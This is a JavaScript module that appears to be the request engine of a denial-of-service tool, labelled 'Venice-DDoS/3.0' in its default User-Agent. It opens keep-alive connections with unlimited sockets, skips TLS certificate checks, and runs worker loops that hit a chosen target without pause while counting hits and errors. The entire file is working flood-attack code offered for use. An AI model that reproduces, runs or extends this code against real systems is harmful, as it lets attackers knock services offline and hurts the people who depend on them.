'use strict';

const http = require('http');
const https = require('https');

function createAgent(target, opts) {
  const mod = target.secure ? https : http;
  return new mod.Agent({
    keepAlive: true,
    keepAliveMsecs: Number(opts.keepAliveMsecs) || 30000,
    maxSockets: Infinity,
    maxFreeSockets: 256,
    scheduling: 'lifo',
    timeout: Number(opts.socketTimeout) || 10000,
  });
}

function baseHeaders(target, opts) {
  return {
    Host: target.hostHeader,
    'User-Agent': opts.userAgent || 'Venice-DDoS/3.0',
    Accept: '*/*',
    'Accept-Encoding': 'identity',
    Connection: 'keep-alive',
  };
}

function once(ctx, agent, spec) {
  const { target, stats, opts } = ctx;
  const mod = target.secure ? https : http;

  return new Promise((resolve) => {
    let settled = false;
    const finish = (err, bytes) => {
      if (settled) return;
      settled = true;
      if (err) stats.err(); else stats.hit(bytes || 0);
      resolve();
    };

    const req = mod.request(
      {
        hostname: target.host,
        port: target.port,
        path: spec.path || target.path,
        method: spec.method || 'GET',
        agent,
        servername: target.secure ? target.host : undefined,
        rejectUnauthorized: false,
        headers: Object.assign(baseHeaders(target, opts), spec.headers),
      },
      (res) => {
        if (spec.method === 'HEAD') {
          res.resume();
          finish(null, Number(res.headers['content-length']) || 0);
          return;
        }
        let bytes = 0;
        res.on('data', (c) => { bytes += c.length; });
        res.on('end', () => finish(null, bytes));
        res.on('aborted', () => finish(new Error('aborted'), bytes));
        res.on('error', () => finish(new Error('res'), bytes));
      }
    );

    req.on('error', () => finish(new Error('req')));
    req.setTimeout(Number(opts.socketTimeout) || 10000, () => req.destroy(new Error('timeout')));
    req.end(spec.body);
  });
}

function createHttpMethod(ctx, build) {
  const agent = createAgent(ctx.target, ctx.opts);
  return {
    async worker() {
      while (ctx.running) await once(ctx, agent, build());
    },
    destroy() { try { agent.destroy(); } catch {} },
  };
}

module.exports = { createHttpMethod, createAgent, once };
